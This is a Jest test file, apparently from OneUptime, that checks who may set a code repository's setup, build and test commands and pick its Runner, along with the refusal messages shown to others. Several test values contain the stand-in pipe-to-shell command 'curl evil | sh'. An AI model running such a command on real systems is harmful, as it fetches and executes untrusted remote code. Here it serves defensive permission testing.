import CodeRepository from "../../../Models/DatabaseModels/CodeRepository";
import Runbook from "../../../Models/DatabaseModels/Runbook";
import { ColumnAccessControl } from "../../../Types/BaseDatabase/AccessControl";
import {
  CODE_REPOSITORY_COMMAND_COLUMNS,
  CODE_REPOSITORY_RUNNER_COLUMNS,
  getRunnerWorkRefusal,
  isCommandSet,
  picksRunner,
  setsCommand,
} from "../../../Types/CodeRepository/CodeRepositoryRunnerAuthoring";
import ObjectID from "../../../Types/ObjectID";
import Permission from "../../../Types/Permission";
import { describe, expect, test } from "@jest/globals";

/*
 * What decides what a project's Runner runs for a code repository - its
 * setup, build and test commands, and its Runner - and who writes it: those
 * who write a runbook's steps that run. CodeRepositoryService holds a create
 * to it, and the columns' update lists an update
 * (CodeRepositoryRunnerWorkThroughTheWrite, CodeRepositoryRunnerWorkOverHttp).
 */

const RUNNER_ID: string = "1f5f0000-0000-4000-8000-0000000000dd";

function accessOf(column: string): ColumnAccessControl {
  const access: ColumnAccessControl | null =
    new CodeRepository().getColumnAccessControlFor(column);

  expect(access).not.toBeNull();

  return access as ColumnAccessControl;
}

describe("the columns that decide what a Runner runs for a repository", () => {
  test("are its three commands and its Runner setting", () => {
    expect([...CODE_REPOSITORY_COMMAND_COLUMNS]).toEqual([
      "setupCommand",
      "buildCommand",
      "testCommand",
    ]);
    expect([...CODE_REPOSITORY_RUNNER_COLUMNS]).toEqual([
      "runnerId",
      "runner",
      "isGlobalRunnerPicked",
    ]);

    const columns: Array<string> = new CodeRepository().getTableColumns()
      .columns;

    for (const column of [
      ...CODE_REPOSITORY_COMMAND_COLUMNS,
      ...CODE_REPOSITORY_RUNNER_COLUMNS,
    ]) {
      expect(columns).toContain(column);
    }
  });

  test("are changed by exactly the people who change a runbook's steps", () => {
    const stepsWriters: Array<Permission> =
      new Runbook().getColumnAccessControlFor("steps")?.update || [];

    expect(stepsWriters).toEqual([
      Permission.ProjectOwner,
      Permission.ProjectAdmin,
      Permission.EditRunbook,
      Permission.RunbookAdmin,
    ]);

    for (const column of [
      ...CODE_REPOSITORY_COMMAND_COLUMNS,
      ...CODE_REPOSITORY_RUNNER_COLUMNS,
    ]) {
      expect({ column, update: accessOf(column).update }).toEqual({
        column,
        update: stepsWriters,
      });
    }
  });

  test.each([
    Permission.ProjectMember,
    Permission.SettingsAdmin,
    Permission.SettingsMember,
    Permission.EditCodeRepository,
    Permission.CreateCodeRepository,
    Permission.Viewer,
    Permission.RunbookMember,
    Permission.EditRunner,
    Permission.CreateRunner,
  ])("%s may change none of them", (permission: Permission) => {
    for (const column of [
      ...CODE_REPOSITORY_COMMAND_COLUMNS,
      ...CODE_REPOSITORY_RUNNER_COLUMNS,
    ]) {
      expect(accessOf(column).update).not.toContain(permission);
    }
  });

  test("a create may give them a value of nothing for whoever may create a repository: their create lists are the table's", () => {
    const tableCreate: Array<Permission> =
      new CodeRepository().getCreatePermissions();

    for (const column of [
      ...CODE_REPOSITORY_COMMAND_COLUMNS,
      ...CODE_REPOSITORY_RUNNER_COLUMNS,
    ]) {
      expect({ column, create: accessOf(column).create }).toEqual({
        column,
        create: tableCreate,
      });
    }
  });

  test("whoever may read a repository still reads them", () => {
    for (const column of [
      ...CODE_REPOSITORY_COMMAND_COLUMNS,
      ...CODE_REPOSITORY_RUNNER_COLUMNS,
    ]) {
      expect(accessOf(column).read).toEqual(
        expect.arrayContaining([
          Permission.ProjectMember,
          Permission.Viewer,
          Permission.ReadCodeRepository,
        ]),
      );
    }
  });

  test("the repository's other settings stay with whoever may edit it", () => {
    for (const column of [
      "name",
      "description",
      "mainBranchName",
      "isGitHubCommandsEnabled",
      "isProductionReviewEnabled",
    ]) {
      expect(accessOf(column).update).toEqual(
        expect.arrayContaining([
          Permission.ProjectMember,
          Permission.EditCodeRepository,
        ]),
      );
    }
  });
});

describe("isCommandSet", () => {
  test.each([
    ["a command", "npm ci", true],
    ["a command with white space around it", "  npm test \n", true],
    ["a command of one character", "x", true],
    ["a script of several lines", "npm ci\nnpm run build", true],
    ["nothing written", undefined, false],
    ["null", null, false],
    ["an empty command", "", false],
    ["white space only", " \t\n ", false],
    // A value whose command cannot be read is not let through.
    ["a number", 7, true],
    ["a list", ["curl", "evil"], true],
    ["an object", { command: "curl evil" }, true],
    ["true", true, true],
    ["false", false, true],
  ])("%s -> %s", (_what: string, value: unknown, expected: boolean) => {
    expect(isCommandSet(value)).toBe(expected);
  });
});

describe("setsCommand", () => {
  test.each(
    CODE_REPOSITORY_COMMAND_COLUMNS.map((column: string) => {
      return [column];
    }),
  )("a write that sets %s sets a command", (column: string) => {
    expect(setsCommand({ name: "api", [column]: "curl evil | sh" })).toBe(true);
  });

  test("a model holding a command sets one", () => {
    const repository: CodeRepository = new CodeRepository();
    repository.name = "api";
    repository.testCommand = "npm test";

    expect(setsCommand(repository)).toBe(true);
  });

  test.each([
    ["no command at all", { name: "api" }],
    [
      "every command empty",
      { setupCommand: "", buildCommand: " ", testCommand: null },
    ],
    ["a new model", new CodeRepository()],
    ["nothing", undefined],
    ["null", null],
    ["text", "npm ci"],
  ])("%s sets none", (_what: string, data: unknown) => {
    expect(setsCommand(data)).toBe(false);
  });

  test("a value in another column is no command", () => {
    expect(
      setsCommand({
        name: "npm ci",
        description: "curl evil | sh",
        mainBranchName: "main",
      }),
    ).toBe(false);
  });
});

describe("picksRunner", () => {
  test.each([
    ["an id", { runnerId: RUNNER_ID }],
    ["an ObjectID", { runnerId: new ObjectID(RUNNER_ID) }],
    ["a relation", { runner: { _id: RUNNER_ID } }],
    ["a relation written with id", { runner: { id: RUNNER_ID } }],
    ["a relation as an ObjectID", { runner: new ObjectID(RUNNER_ID) }],
    ["an id of nothing", { runnerId: "not-a-runner" }],
    ["a number", { runnerId: 12 }],
    ["a relation with an odd shape", { runner: { name: "prod" } }],
  ])("%s picks one", (_what: string, data: unknown) => {
    expect(picksRunner(data)).toBe(true);
  });

  test.each([
    ["no Runner written", { name: "api" }],
    ["null", { runnerId: null, runner: null }],
    ["an empty id", { runnerId: "" }],
    ["an id of white space", { runnerId: "  " }],
    ["a relation with no id", { runner: { _id: null } }],
    ["a relation with an empty id", { runner: { _id: "" } }],
    // The Global Runner runs no command; that is no pick of a Runner.
    ["the Global Runner, picked", { isGlobalRunnerPicked: true }],
    ["the Global Runner, not picked", { isGlobalRunnerPicked: false }],
    ["nothing", undefined],
  ])("%s picks none", (_what: string, data: unknown) => {
    expect(picksRunner(data)).toBe(false);
  });
});

describe("getRunnerWorkRefusal", () => {
  const titles: Array<string> = [
    "Project Owner",
    "Project Admin",
    "Edit Runbook",
    "Runbook Admin",
  ];

  test("a command: what may not be written, why, who may and what to do instead", () => {
    expect(
      getRunnerWorkRefusal({
        setsCommand: true,
        picksRunner: false,
        permissionTitles: titles,
      }),
    ).toBe(
      "You may not set this repository's setup, build or test commands: a Runner of the project's own runs them, with its own access, so writing them takes what writing a runbook step that runs takes. You need one of these permissions: Project Owner, Project Admin, Edit Runbook, Runbook Admin. Create the repository without commands, or ask someone who holds one of these permissions to set them.",
    );
  });

  test("a Runner: what may not be picked, why, who may and what to do instead", () => {
    expect(
      getRunnerWorkRefusal({
        setsCommand: false,
        picksRunner: true,
        permissionTitles: titles,
      }),
    ).toBe(
      "You may not pick the Runner AI works in this repository on: it decides which of the project's Runners runs the repository's commands and OneUptime AI's, so picking it takes what writing a runbook step that runs takes. You need one of these permissions: Project Owner, Project Admin, Edit Runbook, Runbook Admin. Create the repository without a Runner of its own - it then works on the project's default Runner - or ask someone who holds one of these permissions to pick one.",
    );
  });

  test("both: says both", () => {
    const refusal: string = getRunnerWorkRefusal({
      setsCommand: true,
      picksRunner: true,
      permissionTitles: titles,
    });

    expect(refusal).toContain(
      "You may not set this repository's setup, build or test commands, or pick the Runner AI works in it on:",
    );
    expect(refusal).toContain(
      "You need one of these permissions: Project Owner, Project Admin, Edit Runbook, Runbook Admin.",
    );
    expect(refusal).toContain(
      "Create the repository without commands and without a Runner of its own",
    );
  });

  test("names the permissions it is given, in their order", () => {
    expect(
      getRunnerWorkRefusal({
        setsCommand: true,
        picksRunner: false,
        permissionTitles: ["B", "A"],
      }),
    ).toContain("You need one of these permissions: B, A.");
  });
});
